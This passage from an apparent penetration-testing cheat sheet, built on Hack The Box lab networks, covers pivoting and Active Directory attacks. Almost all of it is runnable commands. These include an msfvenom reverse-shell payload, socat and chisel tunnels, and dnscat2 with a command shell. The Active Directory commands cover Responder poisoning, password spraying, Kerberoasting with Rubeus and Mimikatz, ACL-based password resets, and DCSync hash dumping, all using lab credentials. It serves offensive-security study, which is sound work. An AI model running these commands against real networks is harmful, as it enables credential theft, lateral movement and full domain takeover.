1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```


### SOCKS Proxy with MSF

Setup
```bash
msf6 > use auxiliary/server/socks_proxy

set SRVPORT 9050

set SRVHOST 0.0.0.0

set version 4a

run
```

Creating Routes with AutoRoute
```bash
msf6 > use post/multi/manage/autoroute

set SESSION 1

set SUBNET 172.16.5.0

run
```

Can be set within meterpreter session
```bash
meterpreter > run autoroute -s 172.16.5.0/23

# List Active Routes
meterpreter > run autoroute -p
```

### Port Forwarding with MSF

Creating a Local TCP Relay within Meterpreter Session
```bash
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

Connecting to target
```bash
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

### Reverse Port Forwading with MSF
Setting rules within meterpreter session
```bash

meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

Configuring & Starting multi/handler
```bash
meterpreter > bg

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp

set LPORT 8081

set LHOST 0.0.0.0

run
```

Reverse Shell Windows Payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

### Socat
Listen on Port 8080 and Forward Traffic to port 80 (Forward from DMZ Compromised to Attack Host)
```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Listen on port 8080 and Forward to port 8443 (Forward from attack host to target - Bind shell usage)
```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

### Other Port Forawding / Pivoting Alternatives
Plink
```bash
plink -ssh -D 9050 ubuntu@10.129.15.50
```

Sshuttle
```bash
# Installation
sudo apt-get install sshuttle

# Include the Internal Address Range to Route Through (172.16.5.0/23)
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 

# Creates iptables entries to redirect all traffic to 172.16.5.0/23 rabge tgrough pivot host (10.129.202.64)
```

Rpivot
```bash
# Install python 2.7 (Needed on both Attack and Pivot Host)
sudo apt-get install python2.7

# Or
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7

# Clone Rpivot
git clone https://github.com/klsecservices/rpivot.git

# Run Rpivot Server on Attack Host
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Run Rpivot Client on Pivot Host
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

# Connecting to a Web Server using HTTP-Proxy & NTLM Auth
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

Netsh.exe
```bat
REM Built in windows tool for port forwarding
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25

REM Verify Port Forward
netsh.exe interface portproxy show v4tov4
```

Dnscat2
```bash
# Cloning dnscat2 and Setting Up the Server
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install

# Starting the dnscat2 server
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache


# Cloning dnscat2-powershell → To transfer to target
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```
```bash
# Import dnscat2.ps1 on target
Import-Module .\dnscat2.ps1

# Starting dnscat2 on target with pre shared secret
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```
```bash 
# Interacting with the Established Session (Shell)
dnscat2> window -i 1
```

### SOCKS5 Tunneling with Chisel

Cloning and Building Chisel
```bash
git clone https://github.com/jpillora/chisel.git

cd chisel

go build
```

Running Chisel on Pivot Host
```bash
./chisel server -v -p 1234 --socks5
```

Connecting to Chisel Server From Attack Host
```bash
./chisel client -v 10.129.202.64:1234 socks
```

This can be done In reverse
```bash
# Attack Host
sudo ./chisel server --reverse -v -p 1234 --socks5
```
```bash
# Pivot Host
./chisel client -v 10.10.14.17:1234 R:socks
```

Adding socks5 to ProxyCahins Config (Port 1080)
```bash
# Check if already configured
tail -4 /etc/proxychains.conf

# If not
echo 'socks5 	127.0.0.1 1080' >> /etc/proxychains.conf
```

### ICMP Tunneling with Socks

Installing ptunnel-ng
```bash
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng/
sudo ./autogen.sh

# or 
git clone https://github.com/utoni/ptunnel-ng.git
sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
```

Starting the ptunnel-ng Server on the Target Host
```bash
sudo ./ptunnel-ng -r10.129.202.64 -R22
```

Connecting to ptunnel-ng Server from Attack Host
```bash
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

Enabling Dynamic Port Forwarding over SSH
```bash
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

Proxychaining through the ICMP Tunnel
```bash
proxychains nmap -sV -sT 172.16.5.19 -p3389
```
## 32. Active Directory (AD) Enumeration & Attacks
Tools:
- PowerView/SharpView: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 / https://github.com/dmchell/SharpView
- BloodHound: https://github.com/BloodHoundAD/BloodHound
- BloodHound.py: https://github.com/fox-it/BloodHound.py
- Sharp Hound: https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
- Kerbrute: https://github.com/ropnop/kerbrute
- Impacket toolkit: https://github.com/SecureAuthCorp/impacket
- Responder: https://github.com/lgandx/Responder
- Inveigh.ps1: https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1
C# Inveigh (InveighZero): https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh
- rpcinfo: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo 
- rpcclient: https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html
- CrackMapExec (CME): https://github.com/byt3bl33d3r/CrackMapExec
- Rubeus: https://github.com/GhostPack/Rubeus
- GetUserSPNs.py: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
- Hashcat: https://hashcat.net/hashcat/
- enum4linux: https://github.com/CiscoCXSecurity/enum4linux
- enum4linux-ng: https://github.com/cddmp/enum4linux-ng
- ldapsearch: https://linux.die.net/man/1/ldapsearch
- windapsearch: https://github.com/ropnop/windapsearch
- DomainPasswordSpray.ps1: https://github.com/dafthack/DomainPasswordSpray
- LAPSToolkit: https://github.com/leoloobeek/LAPSToolkit
- smbmap: https://github.com/ShawnDEvans/smbmap
- psexec.py: https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
- wmiexec.py: https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
- Snaffler: https://github.com/SnaffCon/Snaffler
- smbserver.py: https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py
- setspn.exe: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)
- Mimikatz: https://github.com/ParrotSec/mimikatz
- secretsdump.py: https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
- evil-winrm: https://github.com/Hackplayers/evil-winrm
- mssqlclient.py: https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py
- noPac.py: https://github.com/Ridter/noPac
- rpcdump.py: https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py
- CVE-2021-1675.py: https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py
- ntlmrelayx.py: https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py
- PetitPotam.py: https://github.com/topotam/PetitPotam
- gettgtpkinit.py: https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
- getnthash.py: https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py
- adidnsdump: https://github.com/dirkjanm/adidnsdump
- gpp-decrypt: https://github.com/t0thkr1s/gpp-decrypt
- GetNPUsers.py: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
- lookupsid.py: https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py
- ticketer.py: https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py
- raiseChild.py: https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py
- Active Directory Explorer: https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer
- PingCastle: https://www.pingcastle.com/documentation/
- Group3r: https://github.com/Group3r/Group3r
- ADRecon: https://github.com/adrecon/ADRecon

### Enumeration of Target Environment

A simple first step could be to capture network traffic to check for hosts and ARP / MDNS requests/replies.
```bash
sudo -E wireshark

# Or for hosts without GUI take a tcpdump
sudo tcpdump -i ens224 
```

Can use responder's Analyze mode to passivley listen to network traffic.
```bash
sudo responder -I ens224 -A 
```

Ping Sweep for target hosts within identified CIDR network.
```bash
fping -asgq 172.16.5.0/23
```

Nmap all identified hosts.
```bash
sudo nmap -v -A -iL hosts.txt -oN /host-enum
```

Installing Kerbrute.
```bash
sudo git clone https://github.com/ropnop/kerbrute.git
sudo make all
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

Enumerating Users with Kerbrute and Insidetrust user list (https://github.com/insidetrust/statistically-likely-usernames).
```bash
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

### LLMNR/NBT-NS Poisoning (Responder)
Starting responder
```bash
sudo responder -I ens224 
```

This can also be don on windows with Inveigh.
```bash
Import-Module .\Inveigh.ps1

# Start Inveigh and output to file / terminal
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# Compiled binary (InveighZero) is aso an option.
.\Inveigh.exe

# Get Hashes inside Inveigh console
GET NTLMV2UNIQUE

# Get Usernames inside Inveigh console
GET NTLMV2USERNAMES
```

### Password Spraying
#### Password Policy Discovery
Enumerating the Password Policy  (With Prior Valid Creds)
```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

Check a Domain Controller for SMB NULL session access
```bash
rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo

# Check for password policy
rpcclient $> getdompwinfo
```

Enumerate & Retrieve password policy with enum4linux
```bash
enum4linux -P 172.16.5.5
```

Password policy with ldapsearch and anonymous bond
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Enumerating & Retrieving Password Policies using net.exe (Windows)
```bat
net accounts
```

Or using PowerView
```bash
import-module .\PowerView.ps1
Get-DomainPolicy
```

Default password policy when a new domain is created:
| Policy | Default Value |
|---|---|
| Enforce password history | `24 days` |
| Maximum password age |	`42 days`|
| Minimum password age |	`1 day`|
| Minimum password length	| `7`|
| Password must meet complexity requirements |	`Enabled`|
| Store passwords using reversible encryption |	`Disabled`|
| Account lockout duration |	`Not set`|
| Account lockout threshold	| `0`|
| Reset account lockout counter after	| `Not set`|
#### Username Enumeration
Using enum4linux to get valid users
```bash
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > validUsers.txt
```
Using rpcclient to get valid users (Anonymous connection Enabled)
```bash
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers 
```

Using crackmapexec to get valid users (SMB NULL sessions Enabled)
```bash
crackmapexec smb 172.16.5.5 --users
```

Using ldapsearch to get valid users (Anonymous Bind Enabled)
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```
Using windapsearch to get valid users (Anonymous Bind Enabled)
```bash
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

Kerbrute User Enumeration
```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

# If you want in a file
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt | grep "\[+\] VALID USERNAME" | awk -F" " '{print $7}' | awk -F"@" '{print $1}' | sort -u > valid_users.txt
```
```

User list with Valid Credentials
```bash
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```
#### Password Spraying from Linux
One Liner Password Spraying
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Password Spraying with Kerbrute
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1 



Password Spraying with CrackMapExec
```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

Password spraying password resuse for local admin user on different hosts
```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

#### Password Spraying from Windows
Password Spraying Using DomainPasswordSpray.ps1
```bash
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```


### Enumerating Security Controls
Check Current Windows Defender Status
```bash
Get-MpComputerStatus
```

Checking App Locker Policy
```bash
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Check Whether in Full or Constrained Language Mode
```bash
$ExecutionContext.SessionState.LanguageMode
```

See which user groups can read Local Administrator Password Solution (LAPS) 
```bash
Find-LAPSDelegatedGroups
```

Check LAPS rights on each computer
```bash
Find-AdmPwdExtendedRights
```

Search for hosts that have LAPS enabled when passwords expire
```bash
Get-LAPSComputers
```

### Credential Enumeration (From Linux)
#### Crackmapexec (CME)
Crackmapexec (CME) Options:

- `-u Username` The user whose credentials we will use to authenticate

- `-p` Password User's password

- `Target (IP or FQDN)` Target host to enumerate (in our case, the Domain Controller) 

- `--users` Specifies to enumerate Domain Users

- `--groups` Specifies to enumerate domain groups

- `--loggedon-users` Attempts to enumerate what users are logged on to a target, if any

List domain users
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

Domain Group Enumeration
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

Logged On Users
```bash
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

Share Enumeration
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

Enumerate Readable Files (Spider_plus)
```bash
# Readable files stored in /tmp/cme_spider_plus
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

#### SMBMap
Share Enumeration
```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

Reccursive List Of All Directories
```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

#### rpcclient

Connection
```bash
rpcclient -U "" -N 172.16.5.5
``` 

Gather User RIDs
```bash
rpcclient $> enumdomusers
```

User Enumeration (By RID)
```bash
rpcclient $> queryuser 0x457
```

#### Interactive Windows Shells
psexec
```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```
wmiexec.py
```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

#### Windapsearch
Enumerate domain admins group members
```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

Enumerate users with elevated privileges
```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

#### Bloodhound
Executing BloodHound.py
```bash 
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all --zip
```

Starting GUI
```bash
# Note: must be in rdp session not ssh

# Start neo4j service
sudo neo4j start

# Lanuch Bloodhound GUI
bloodhound

# Note: Creds for Linux attack host bloodhound are user == neo4j / pass == HTB_@cademy_stdnt!

# Note: Click Upload Data button and select zip file of bloodhount outputs
```

### Credential Enumeration (From Windows)
#### ActiveDirectory PowerShell Module
Importing ActiveDirectory Module
```bash
Import-Module ActiveDirectory
```

Get Domain Info
```bash
Get-ADDomain
```

Get-ADUser (Filtering for accounts with the Service PrincipleName property), listing accounts that may be susceptible to a Kerberoasting attack
```bash
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

Verify Domain Trust Relationships
```bash
Get-ADTrust -Filter *
```

Group Enumeration
```bash
Get-ADGroup -Filter * | select name
```

Detailed Group Info
```bash
Get-ADGroup -Identity "Backup Operators"
```

Group Membership
```bash
Get-ADGroupMember -Identity "Backup Operators"
```


#### GroupPolicy PowerShell Module
Enumerating GPO Names
```bash
Get-GPO -All | Select DisplayName
```

#### PowerView
Importing PowerView Module
```bash
Import-Module .\PowerView.ps1
```


Powerview Commands:
| Command |	Description |
|---|---|
| `Export-PowerViewCSV`	| Append results to a CSV file |
| `ConvertTo-SID` |	Convert a User or group name to its SID value |
| `Get-DomainSPNTicket` |	Requests the Kerberos ticket for a specified Service Principal Name (SPN) account |
| **Domain/LDAP Functions:**|
| `Get-Domain` | Will return the AD object for the current (or specified) domain |
| `Get-DomainController` | Return a list of the Domain Controllers for the specified domain |
| `Get-DomainUser` | Will return all users or specific user objects in AD |
| `Get-DomainComputer` | Will return all computers or specific computer objects in AD |
| `Get-DomainGroup`	| Will return all groups or specific group objects in AD |
| `Get-DomainOU`	| Search for all or specific OU objects in AD |
| `Find-InterestingDomainAcl` | Finds object ACLs in the domain with modification rights set to non-built in objects |
| `Get-DomainGroupMember` | Will return the members of a specific domain group |
| `Get-DomainFileServer` | Returns a list of servers likely functioning as file servers |
| `Get-DomainDFSShare` | Returns a list of all distributed file systems for the current (or specified) domain |
| **GPO Functions:** |
| `Get-DomainGPO`| Will return all GPOs or specific GPO objects in AD |
| `Get-DomainPolicy` | Returns the default domain policy or the domain controller policy for the current domain |
| **Computer Enumeration Functions:** |
| `Get-NetLocalGroup` | Enumerates local groups on the local or a remote machine |
| `Get-NetLocalGroupMember` | Enumerates members of a specific local group |
| `Get-NetShare` | Returns open shares on the local (or a remote) machine |
| `Get-NetSession` | Will return session information for the local (or a remote) machine |
| `Test-AdminAccess` | Tests if the current user has administrative access to the local (or a remote) machine |
| **Threaded 'Meta'-Functions:** |
| `Find-DomainUserLocation` |	Finds machines where specific users are logged in |
| `Find-DomainShare` | Finds reachable shares on domain machines |
| `Find-InterestingDomainShareFile` |	Searches for files matching specific criteria on readable shares in the domain |
| `Find-LocalAdminAccess` | Find machines on the local domain where the current user has local administrator access |
| **Domain Trust Functions:** |
| `Get-DomainTrust` |	Returns domain trusts for the current domain or a specified domain |
| `Get-ForestTrust` |	Returns all forest trusts for the current forest or a specified forest |
| `Get-DomainForeignUser` | Enumerates users who are in groups outside of the user's domain |
| `Get-DomainForeignGroupMember` | Enumerates groups with users outside of the group's domain and returns each foreign member |
| `Get-DomainTrustMapping` |	Will enumerate all trusts for the current domain and any others seen. |


Domain User Information
```bash
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

Recursive Group Membership
```bash
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

Trust Enumeration
```bash
Get-DomainTrustMapping
```

Testing for Local Admin Access
```bash
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

Finding Users With SPN Set (Susceptible to Kerberoasting)
```bash
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

Checking for PASSWD_NOTREQD Setting using Get-DomainUser
```bash
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

Enumerating GPO Names with PowerView
```bash
Get-DomainGPO |select displayname
```

Enumerating Domain User GPO Rights
```bash
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $sid}
```

SharpView.exe can be used as an alternative
```bash
.\SharpView.exe Get-DomainUser -Help
```

#### Credentials in SMB Shares and SYSVOL Scripts

Discovering an Interesting Scripts
```bash
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

Checking For GPP Passwords
```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

#### Other Tools

Snaffler (Share Enumeration)
```bash
.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
```

Sharphound (Bloodhound)
```bash
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

### Kerberoasting
#### From Linux Joined Machine
Install Impacket
```bash
python3 -m pipx install impacket
```

Listing SPN Accounts with GetUserSPNs.py
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

Requesting all TGS Tickets
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```

Request a TGS ticket for a single user
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

Saving the TGS Ticket to an Output File
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

# Hashcat Cracking mode for TGS ticket is 13100

```

#### From Windows Joined Machine
Enumerating SPNs with setspn.exe (CMD)
```bat
setspn.exe -Q */*
```

Targeting a Single User (Powershell)
```bash
# Request and load TGS ticket into memory for extraction with Mimikatz
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

Extracting Tickets from Memory with Mimikatz
```bat
.\mimikatz.exe

mimikatz # base64 /out:true

mimikatz # kerberos::list /export  
```

Retrieving All Tickets Using setspn.exe (Powershell)
```bash
# Request and load TGS ticket into memory for extraction with Mimikatz
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Convert Mimikatz Bas64 Output to be used in Hashcat (Modes 13100)
```bash
echo "<base64_tgs>" |  tr -d \\n | base64 -d > /tmp/temp.kirbi; kirbi2john /tmp/temp.kirbi -o /tmp/crack_file; sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' /tmp/crack_file > tgs_hashcat
```

Using PowerView to Enumerate SPN Accounts
```bash
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```
Using PowerView to Target a Specific User
```bash
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

Exporting all TGS tickets to a CSV
```bash
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

Kerberoasting Enumeration with Rebeus
```bash
.\Rubeus.exe kerberoast /stats
```

Kerberoasting With Rubeus (Admin Accounts LDAP Query)
```bash
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

Specific User
```bash
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

Checking Supported Encryption Types
```bash
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```


### Access Control List (ACL)
#### Enumeration
Find-InterestingDomainAcl (PowerView)
```bash
Find-InterestingDomainAcl
```

Using Get-DomainObjectACL (PowerView)
```bash
# Set Security Identifyer property to perform targeted user search
$sid = Convert-NameToSid wley
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Look For ObjectAceType, shows what rights the searched user has over the object in the form of a GUID
```

Performing a Reverse Search & Mapping to a GUID Value
```bash
$guid= "00299570-246d-11d0-a768-00aa006e0529"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

The Last Two Steps Can Be Combined Using the -ResolveGUIDs Flag
```bash
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} # -Verbose
```

Creating a List of Domain Users
```bash
# Use When No Access To Powerview
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

# Get-ADGroup For Groups

# Search Through the File To Find Object Rights for Specific User
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```

Check If a Group Has Nested Membership in Any Other Groups
```bash
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```


#### PrivEsc / Lateral Movement
Creating a PSCredential Object
```bash
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

Changing A users Password
```bash
# Creating a SecureString Object 
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# Changing The User's Password With powerView and PSCredential Object
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

Adding User To A Group Using Generated Credentials
```bash
# Check Members of Target Group
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

# Add User To Target Group With PSCredential Object
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred -Verbose

# Checking User Is Added To Target Group
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# Once No Longer Needed, Clean Up and Delete the Group
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

Creating a Fake SPN (For user adun in this case)
```bash
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
# Can now attempt to Kerberoast this account

# Once Extracted Hash, To clean up can Delete The SPN
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

#### DCSync Attack

View Users Group membership
```bash
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

Check replication Rights Using Users SID
```bash
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

Extracting NTLM Hashes and Kerberos Keys (Attacker Linux Host)
```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 

# Use -just-dc-ntlm flag for just NTLM Hashes
# Use -just-dc-user tp extract for specific user
```

Enumerating Users with Reversible Encryptions
```bash
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

# Or:
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

Performing Dsync With MimiKatz
```bat
REM Must be run as user with replication Rights
runas /netonly /user:INLANEFREIGHT\adunn powershell

.\mimikatz.exe

mimikatz # privilege::debug

# lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

### Priv Esc / Lateral Movement
Further Reading: `https://github.com/gdedrouas/Exchange-AD-Privesc`


Enumerating Users in the Remote Desktop (RDP) Users Group with PowerView
```bash
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

Enumerating Users in the Remote Management Users Group (WinRM) with PowerView
```bash
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

Searching for WinRM users in bloodhound query
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

WinRM from Windows
```bash
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

WinRM Linux
```bash
gem install evil-winrm

evil-winrm -i 10.129.201.234 -u forend
```

Checking SQL Admin Rights in BloodHound
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

Enumerating MSSQL Instances with PowerUpSQL (CheatSheet: `https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet`)
```bash
cd .\PowerUpSQL\
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain

# Authenticating against remote SQL server
